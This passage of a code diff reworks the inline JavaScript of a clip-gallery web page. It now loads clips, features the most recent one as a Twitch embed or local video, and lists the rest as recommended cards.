-        navLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                
-                // Remove active class from all links and sections
-                navLinks.forEach(l => l.classList.remove('active'));
-                sections.forEach(s => s.classList.remove('active'));
-                
-                // Add active class to clicked link
-                link.classList.add('active');
-                
-                // Show corresponding section
-                const sectionId = link.dataset.section;
-                document.getElementById(sectionId).classList.add('active');
-            });
-        });
+        // Set the most recent clip as featured
+        const featured = sorted[0];
+        window.featuredClip = featured;
 
-        // Populate clips on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            // Featured clip
-            document.getElementById('featured-clip').innerHTML = createClipHTML(featuredClip, true);
+        if (featured) {
+            const featuredVideo = document.getElementById('featuredVideoElement');
+            const featuredIframe = document.getElementById('featuredIframe');
             
-            // Home page clips (excluding featured)
-            const homeClips = clips.slice(1);
-            document.getElementById('home-clips').innerHTML = homeClips.map(clip => createClipHTML(clip)).join('');
+            if (featured.platform === 'twitch') {
+                // Show Twitch iframe
+                const clipId = featured.url.split("/").pop();
+                featuredIframe.src = `https://clips.twitch.tv/embed?clip=${clipId}&parent=${window.location.hostname}`;
+                featuredIframe.style.display = 'block';
+                featuredVideo.style.display = 'none';
+            } else {
+                // Show local video
+                document.getElementById("featuredSrc").src = featured.url;
+                featuredVideo.load();
+                featuredVideo.style.display = 'block';
+                featuredIframe.style.display = 'none';
+            }
             
-            // All clips page
-            document.getElementById('all-clips').innerHTML = clips.map(clip => createClipHTML(clip)).join('');
-        });
-    </script>
+            document.getElementById("featuredTitle").innerText = featured.title;
+            document.getElementById("featuredMeta").innerHTML = `
+                <span class="platform-badge ${featured.platform}">${featured.platform.toUpperCase()}</span>
+                <span>👀 ${featured.views} views</span>
+                <span>❤️ ${featured.likes} likes</span>
+            `;
+        }
+
+        // Load recommended clips (exclude featured)
+        const recommended = sorted.slice(1);
+        for (const clip of recommended) {
+            grid.innerHTML += generateClipCard(clip);
+        }
+        } catch (error) {
+            console.error('Error loading clips:', error);
+            document.getElementById("featuredTitle").innerText = "Error loading clips";
+            document.getElementById("featuredMeta").innerHTML = '<span>Check that clips.json exists and is valid JSON</span>';
+        }
+    }
+
+    // Load clips when page loads
+    window.onload = async () => {
+        await loadClips();
+    };
+  </script>
 </body>
 </html>
